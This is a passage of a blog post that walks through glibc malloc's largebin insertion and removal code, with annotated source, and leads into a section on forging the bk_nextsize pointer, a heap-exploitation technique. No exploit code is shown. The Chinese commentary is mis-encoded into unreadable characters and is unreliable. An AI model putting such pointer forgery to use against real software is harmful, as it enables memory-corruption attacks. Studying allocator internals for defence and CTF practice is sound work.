<h3 id="å®mark-bin"><a href="#å®mark-bin" class="headerlink" title="å®mark_bin"></a>å®mark_bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br></pre></td></tr></table></figure>

<p>mark_bin è®¾ç½®ç¬¬ i ä¸ª bin åœ¨ binmap ä¸­å¯¹åº”çš„ bit ä½ä¸º 1</p>
<h3 id="bitmap"><a href="#bitmap" class="headerlink" title="bitmap"></a>bitmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT) <span class="comment">// 32</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)<span class="comment">// 128 / 32 = 4</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];             <span class="comment">// 32b * 4 = 128b</span></span><br></pre></td></tr></table></figure>

<p>ä¸€å…±æœ‰ 128 ä¸ª binï¼Œ0 å’Œ 127 ä¸ç®—ï¼Œä¹Ÿå°±æ˜¯æœ‰ 126 ä¸ª binï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ª bin æ˜¯ unsorted_bin</p>
<p><strong>binmap å­—æ®µæ˜¯ä¸€ä¸ª int æ•°ç»„ï¼Œptmalloc ç”¨ä¸€ä¸ª bit æ¥æ ‡è¯†è¯¥ bit å¯¹åº”çš„ bin ä¸­æ˜¯å¦åŒ…å«ç©ºé—² chunk</strong></p>
<h3 id="largebinçš„æ’å…¥ç›¸å…³æ“ä½œ"><a href="#largebinçš„æ’å…¥ç›¸å…³æ“ä½œ" class="headerlink" title="largebinçš„æ’å…¥ç›¸å…³æ“ä½œ"></a>largebinçš„æ’å…¥ç›¸å…³æ“ä½œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (<span class="built_in">size</span>))		<span class="comment">//å¦‚æœæ˜¯smallbinçš„å¤§å°å°±æ”¾åˆ°smallbin</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = smallbin_index (<span class="built_in">size</span>);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span>													<span class="comment">//å¦‚æœæ˜¯largebinçš„å¤§å°ï¼Œé‚£ä¹ˆï¼š</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (<span class="built_in">size</span>);<span class="comment">//æ ¹æ®sizeè·å–å¯¹åº”çš„largebinç´¢å¼•</span></span><br><span class="line">             bck = bin_at (av, victim_index);		 <span class="comment">//è·å–largebinè¡¨å¤´</span></span><br><span class="line">             fwd = bck-&gt;fd;											 <span class="comment">//è·å–å¯¹åº”ç´¢å¼•largebinçš„ç¬¬ä¸€ä¸ªchunkï¼ˆå¾ªç¯é“¾è¡¨çš„head-&gt;nextï¼‰</span></span><br><span class="line"></span><br><span class="line">             <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">             <span class="keyword">if</span> (fwd != bck)											<span class="comment">//å½“ç¬¬ä¸€ä¸ªä¸ç­‰äºæœ€åä¸€ä¸ªï¼ˆå³å½“å‰çš„largebinä¸ç©ºï¼‰</span></span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                 <span class="built_in">size</span> |= PREV_INUSE;</span><br><span class="line">                 <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                 assert (chunk_main_arena (bck-&gt;bk));	<span class="comment">//æ˜¯å¦åœ¨main_arena?ï¼ˆä¸»çº¿ç¨‹ï¼‰</span></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>)</span><br><span class="line">	      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))<span class="comment">//bck-&gt;bkå‚¨å­˜çš„æ˜¯å½“å‰ç´¢å¼•çš„largebinä¸­å¤§å°æœ€å°çš„chunkï¼Œå¦‚æœæˆ‘ä»¬è¦æ’å…¥çš„chunkæ¯”è¿™ä¸ªå¤§å°è¿˜å°ï¼Œé‚£ä¹ˆå°±è¦æ’å…¥largebinçš„å°¾éƒ¨ã€‚</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;									<span class="comment">//fwdæ­¤æ—¶ä¸ºlargebinè¡¨å¤´</span></span><br><span class="line">                     bck = bck-&gt;bk;							<span class="comment">//bckè®¾ç½®ä¸ºlargebinä¸­æœ€åä¸€ä¸ªçš„chunk</span></span><br><span class="line"></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="comment">//ç”±äºæˆ‘ä»¬è¦æ’å…¥çš„åœ¨æœ«å°¾ï¼Œæ¯”ä»–å°çš„å°±æ˜¯å¾ªç¯å›å»çš„ç¬¬ä¸€ä¸ªchunk</span></span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//æ¯”ä»–å¤§çš„å°±æ˜¯ä¹‹å‰çš„æœ€å°çš„é‚£ä¸ª</span></span><br><span class="line">                     </span><br><span class="line">                     <span class="comment">//åŸæ¥é“¾è¡¨çš„ç¬¬ä¸€ä¸ªchunkçš„bkæŒ‡å‘æ­¤æ—¶æ–°æ’å…¥çš„æœ€åä¸€ä¸ªchunk</span></span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = </span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 </span><br><span class="line">                 <span class="comment">// å¦‚æœä¸æ˜¯æ’å…¥å°¾éƒ¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ‰¾åˆ°è¿™ä¸ªchunkåº”è¯¥æ’å…¥çš„ä½ç½®</span></span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">                     <span class="comment">//ä½¿ç”¨è¿™ä¸ªwhileå¾ªç¯å°è¯•ä»é“¾è¡¨å¤´éƒ¨å¼€å§‹éå†ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ¯”victimå¤§æˆ–ç­‰äºçš„chunké€€å‡ºwhile</span></span><br><span class="line">                     <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;			<span class="comment">//å–ä¸‹ä¸€ä¸ª</span></span><br><span class="line">		  									assert (chunk_main_arena (fwd));<span class="comment">//æ£€æŸ¥åˆ†é…åŒº</span></span><br><span class="line">                       &#125;</span><br><span class="line">										</span><br><span class="line">                     <span class="comment">//å¦‚æœæ‰¾åˆ°äº†è·Ÿä»–æƒ³ç­‰çš„</span></span><br><span class="line">                     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span></span><br><span class="line">		  								== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;<span class="comment">//ç›´æ¥å°†victimæ’å…¥ä»–çš„åé¢ï¼ˆé€šè¿‡fdï¼‰ï¼Œä¸ä¿®æ”¹nextsizeæŒ‡é’ˆã€‚</span></span><br><span class="line">                     </span><br><span class="line">                     <span class="comment">//å¦‚æœå¤§å°ä¸ä¸€æ ·(å³æ­¤æ—¶fwdæ˜¯ç›¸é‚»çš„å¤§äºvictimçš„chunk)</span></span><br><span class="line">                     <span class="comment">//éœ€è¦æ„é€ nextsizeåŒå‘é“¾è¡¨ï¼Œæ„é€ æ–°èŠ‚ç‚¹,victimä½œä¸ºå †å¤´</span></span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         <span class="comment">//æ¯”victimå°çš„æŒ‡å‘fwd</span></span><br><span class="line">                         <span class="comment">//æ¯”victimå¤§çš„æŒ‡å‘fwdçš„bk_nextsizeï¼ˆæ¯”fwdå¤§çš„é‚£ä¸ªï¼‰</span></span><br><span class="line">                         <span class="comment">//ç›¸å½“äºæ’å…¥äº†fwdä¸fwd-&gt;bk_nextsizeä¹‹é—´</span></span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                         </span><br><span class="line">                         <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<span class="comment">//æ£€æŸ¥sizeé“¾å®Œæ•´æ€§</span></span><br><span class="line">                           malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (nextsize)"</span>);</span><br><span class="line">                         <span class="comment">//å¯¹åº”çš„å»æ”¹fwdçš„ç›¸å…³æŒ‡é’ˆæˆé“¾</span></span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                         <span class="comment">//æ’å…¥å®Œæˆ</span></span><br><span class="line">                       &#125;</span><br><span class="line">                      </span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                     <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                       malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//æ­¤æ—¶victimä¸ºå”¯ä¸€çš„chunkï¼Œä¹Ÿè¦åšå¾ªç¯é“¾è¡¨</span></span><br><span class="line">           &#125;</span><br><span class="line">				<span class="comment">//æ”¾åˆ°å¯¹åº”çš„ bin ä¸­ï¼Œæ„æˆ bk&lt;--&gt;victim&lt;--&gt;fwdã€‚</span></span><br><span class="line">         mark_bin (av, victim_index);	<span class="comment">//æ ‡è¯†bitmap</span></span><br><span class="line">         victim-&gt;bk = bck;</span><br><span class="line">         victim-&gt;fd = fwd;</span><br><span class="line">         fwd-&gt;bk = victim;</span><br><span class="line">         bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>è´´ä¸€ä¸‹æ’å…¥è¿‡ç¨‹å¤§ä½¬çš„æ€»ç»“ï¼š</p>
<ol>
<li>æ‰¾åˆ°å½“å‰è¦æ’å…¥çš„chunkå¯¹åº”çš„largebinçš„indexï¼Œå¹¶å®šä½è¯¥indexä¸­çš„æœ€å°çš„chunk<code>bck</code>å’Œæœ€å¤§çš„chunk<code>fwd</code>ã€‚</li>
<li>å¦‚æœ<code>fwd</code>ç­‰äº<code>bck</code>ï¼Œè¡¨æ˜å½“å‰é“¾è¡¨ä¸ºç©ºï¼Œåˆ™ç›´æ¥å°†è¯¥chunkæ’å…¥ï¼Œå¹¶è®¾ç½®è¯¥chunkä¸ºè¯¥å¤§å°å †å—çš„å †å¤´ï¼Œå°†<code>bk_nextsize</code>å’Œ<code>fd_nextsize</code>èµ‹å€¼ä¸ºå®ƒæœ¬èº«ã€‚</li>
<li>å¦‚æœ<code>fwd</code>ä¸ç­‰äº<code>bck</code>ï¼Œè¡¨æ˜å½“å‰é“¾è¡¨å·²ç»å­˜åœ¨chunkï¼Œè¦åšçš„å°±æ˜¯æ‰¾åˆ°å½“å‰chunkå¯¹åº”çš„ä½ç½®å°†å…¶æ’å…¥ã€‚é¦–å…ˆåˆ¤æ–­å…¶å¤§å°æ˜¯å¦å°äºæœ€å°chunkçš„sizeï¼Œ<code>(size) &lt; (bck-&gt;bk-&gt;size)</code>ï¼Œå¦‚æœå°äºåˆ™è¯´æ˜è¯¥chunkä¸ºå½“å‰é“¾è¡¨ä¸­æœ€å°çš„chunkï¼Œå³æ’å…¥ä½ç½®åœ¨é“¾è¡¨æœ«å°¾ï¼Œæ— éœ€éå†é“¾è¡¨ï¼Œç›´æ¥æ’å…¥åˆ°é“¾è¡¨çš„æœ«å°¾ï¼Œä¸”è¯¥chunkæ²¡æœ‰å¯¹åº”çš„å †å¤´ï¼Œè®¾ç½®è¯¥chunkä¸ºç›¸åº”å †å¤§å°å †çš„å †å¤´ï¼Œå°†<code>bk_nextsize</code>æŒ‡å‘æ¯”å®ƒå¤§çš„å †å¤´ï¼Œ<code>fd_nextsize</code>æŒ‡å‘åŒé“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å³æœ€å¤§çš„å †å¤´ã€‚</li>
<li>å¦‚æœå½“å‰chunkçš„sizeä¸æ˜¯æœ€å°çš„chunkï¼Œåˆ™ä»åŒé“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å³æœ€å¤§çš„chunkçš„å †å¤´å¼€å§‹éå†ï¼Œé€šè¿‡<code>fd_nextsize</code>è¿›è¡Œéå†ï¼Œç”±äº<code>fd_nextsize</code>æŒ‡å‘çš„æ˜¯æ¯”å½“å‰å †å¤´å°çš„å †å¤´ï¼Œå› æ­¤å¯ä»¥åŠ å¿«éå†é€Ÿåº¦ã€‚ç›´åˆ°æ‰¾åˆ°å°äºç­‰äºè¦æ’å…¥çš„chunkçš„sizeã€‚</li>
<li>å¦‚æœæ‰¾åˆ°çš„chunkçš„sizeç­‰äºè¦æ’å…¥chunkçš„sizeï¼Œåˆ™è¯´æ˜å½“å‰è¦æ’å…¥çš„chunkçš„sizeå·²ç»å­˜åœ¨å †å¤´ï¼Œé‚£ä¹ˆåªéœ€å°†è¯¥chunkæ’å…¥åˆ°å †å¤´çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚</li>
<li>å¦‚æœæ‰¾åˆ°çš„chunkçš„sizeå°äºå½“å‰è¦æ’å…¥chunkçš„sizeï¼Œåˆ™è¯´æ˜å½“å‰æ’å…¥çš„chunkä¸å­˜åœ¨å †å¤´ï¼Œå› æ­¤è¯¥chunkä¼šæˆä¸ºå †å¤´æ’å…¥åˆ°è¯¥ä½ç½®ï¼Œè®¾ç½®<code>fd_nextsize</code>ä¸<code>bk_nextsize</code>ã€‚</li>
</ol>
<h3 id="largebinçš„å–å‡ºç›¸å…³æ“ä½œ"><a href="#largebinçš„å–å‡ºç›¸å…³æ“ä½œ" class="headerlink" title="largebinçš„å–å‡ºç›¸å…³æ“ä½œ"></a>largebinçš„å–å‡ºç›¸å…³æ“ä½œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))<span class="comment">//å¦‚æœä¸åœ¨samllbinå¤§å°ä¸­</span></span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx); <span class="comment">//æ‰¾åˆ°ç”³è¯·çš„sizeå¯¹åº”çš„largebiné“¾è¡¨</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;					<span class="comment">//æ­¤æ—¶victimä¸ºé“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)) <span class="comment">//ç¬¬ä¸€æ­¥ï¼Œåˆ¤æ–­é“¾è¡¨çš„ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼Œå³æœ€å¤§çš„chunkæ˜¯å¦å¤§äºè¦ç”³è¯·çš„size</span></span><br><span class="line">            &#123;</span><br><span class="line">            	<span class="comment">//è¿›å…¥è¿™é‡Œæ—¶ï¼Œå·²ç»ç¡®å®šé“¾è¡¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹â€”â€”å³æœ€å¤§çš„chunkå¤§äºè¦ç”³è¯·çš„sizeï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥ä»è¿™ä¸€æ¡é“¾ä¸­å–ï¼Œé—®é¢˜å°±æ˜¯å–è¿™ä¸€æ¡é“¾ä¸Šçš„å“ªä¸€ä¸ªï¼Ÿ</span></span><br><span class="line">              victim = victim-&gt;bk_nextsize; <span class="comment">//æœ¬æ¥victimæ˜¯é“¾ä¸­æœ€å¤§çš„é‚£ä¸ªï¼Œç°åœ¨æˆ‘ä»¬è¦ä»å°å¾€éå†ï¼Œé‚£ä¹ˆvictim-&gt;bk_nextsizeå°±å¾ªç¯å›äº†é“¾ä¸­æœ€å°çš„é‚£ä¸ª</span></span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span> = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))) <span class="comment">//ç¬¬äºŒæ­¥ï¼Œä»æœ€å°çš„chunkå¼€å§‹ï¼Œåå‘éå† chunk sizeé“¾è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¤§äºç­‰äºæ‰€éœ€chunkå¤§å°çš„chunké€€å‡ºå¾ªç¯</span></span><br><span class="line">                victim = victim-&gt;bk_nextsize;<span class="comment">//victimå–ç›¸é‚»çš„æ›´å¤§sizeçš„chunk </span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;<span class="built_in">size</span> == victim-&gt;fd-&gt;<span class="built_in">size</span>) <span class="comment">//ç¬¬ä¸‰æ­¥ï¼Œç”³è¯·çš„chunkå¯¹åº”çš„chunkå­˜åœ¨å¤šä¸ªç»“ç‚¹ï¼Œåˆ™ç”³è¯·ç›¸åº”å †å¤´çš„ä¸‹ä¸ªç»“ç‚¹ï¼Œä¸ç”³è¯·å †å¤´ã€‚</span></span><br><span class="line">                victim = victim-&gt;fd;			<span class="comment">//å‡ºç°ç›¸åŒå¤§å°æ—¶å †å¤´ä½œä¸ºæ¬¡ä¼˜å…ˆç”³è¯·</span></span><br><span class="line"></span><br><span class="line">              remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//ç¬¬å››æ­¥ï¼Œlargebin unlink æ“ä½œ</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE) <span class="comment">//ç¬¬äº”æ­¥ï¼Œå¦‚æœå‰©ä½™çš„ç©ºé—´å°äºMINSIZEï¼Œåˆ™å°†è¯¥ç©ºé—´ç›´æ¥ç»™ç”¨æˆ·</span></span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;<span class="built_in">size</span> |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb); <span class="comment">//ç¬¬å…­æ­¥ï¼Œå¦‚æœå½“å‰å‰©ä½™ç©ºé—´è¿˜å¯ä»¥æ„æˆchunkï¼Œåˆ™å°†å‰©ä½™çš„ç©ºé—´æ”¾å…¥åˆ°unsorted binä¸­ï¼ˆåˆ‡å‰²åï¼‰ã€‚</span></span><br><span class="line">                </span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);<span class="comment">//bckæ˜¯ubå¤´</span></span><br><span class="line">                  fwd = bck-&gt;fd;						 <span class="comment">//fwdæ˜¯ubç¬¬ä¸€ä¸ªchunk</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                <span class="comment">//ä»¥ä¸Šæ“ä½œå®Œæˆålastremainderè¢«æ’å…¥ubï¼Œæˆä¸ºæ–°çš„é“¾é¦–å…ƒç´ </span></span><br><span class="line">                <span class="comment">//å¦‚æœä¸åœ¨smallbinèŒƒå›´ï¼Œé‚£ä¹ˆnextsizeæŒ‡é’ˆç½®ç©º</span></span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                </span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>è´´ä¸€ä¸‹ç”³è¯·è¿‡ç¨‹å¤§ä½¬çš„æ€»ç»“ï¼š</p>
<ol>
<li>æ‰¾åˆ°å½“å‰è¦ç”³è¯·çš„ç©ºé—´å¯¹åº”çš„largebiné“¾è¡¨ï¼Œåˆ¤æ–­ç¬¬ä¸€ä¸ªç»“ç‚¹å³æœ€å¤§ç»“ç‚¹çš„å¤§å°æ˜¯å¦å¤§äºè¦ç”³è¯·çš„ç©ºé—´ï¼Œå¦‚æœå°äºåˆ™è¯´æ˜largebinä¸­æ²¡æœ‰åˆé€‚çš„å †å—ï¼Œéœ€é‡‡ç”¨å…¶ä»–åˆ†é…æ–¹å¼ã€‚</li>
<li>å¦‚æœå½“å‰largebinä¸­å­˜åœ¨åˆé€‚çš„å †å—ï¼Œåˆ™ä»æœ€å°å †å—å¼€å§‹ï¼Œé€šè¿‡<code>bk_nextsize</code>åå‘éå†é“¾è¡¨ï¼Œæ‰¾åˆ°å¤§äºç­‰äºå½“å‰ç”³è¯·ç©ºé—´çš„ç»“ç‚¹ã€‚</li>
<li>ä¸ºå‡å°‘æ“ä½œï¼Œåˆ¤æ–­æ‰¾åˆ°çš„ç›¸åº”ç»“ç‚¹ï¼ˆå †å¤´ï¼‰çš„ä¸‹ä¸ªç»“ç‚¹æ˜¯å¦æ˜¯ç›¸åŒå¤§å°çš„å †å—ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°†ç›®æ ‡è®¾ç½®ä¸ºè¯¥å †å¤´çš„ç¬¬äºŒä¸ªç»“ç‚¹ï¼Œä»¥æ­¤å‡å°‘å°†<code>fd_nextsize</code>ä¸<code>bk_nextsize</code>èµ‹å€¼çš„æ“ä½œã€‚</li>
<li>è°ƒç”¨<code>unlink</code>å°†ç›®æ ‡largebin chunkä»åŒé“¾è¡¨ä¸­å–ä¸‹ã€‚</li>
<li>åˆ¤æ–­å‰©ä½™ç©ºé—´æ˜¯å¦å°äºMINSIZEï¼Œå¦‚æœå°äºç›´æ¥è¿”å›ç»™ç”¨æˆ·ã€‚</li>
<li>å¦åˆ™å°†å‰©ä½™çš„ç©ºé—´æ„æˆæ–°çš„chunkæ”¾å…¥åˆ°unsorted binä¸­ã€‚</li>
</ol>
<h2 id="ä¼ªé€ Largebinçš„bk-nextsizeï¼ˆå–å‡ºæ—¶ï¼‰"><a href="#ä¼ªé€ Largebinçš„bk-nextsizeï¼ˆå–å‡ºæ—¶ï¼‰" class="headerlink" title="ä¼ªé€ Largebinçš„bk_nextsizeï¼ˆå–å‡ºæ—¶ï¼‰"></a>ä¼ªé€ Largebinçš„bk_nextsizeï¼ˆå–å‡ºæ—¶ï¼‰</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span 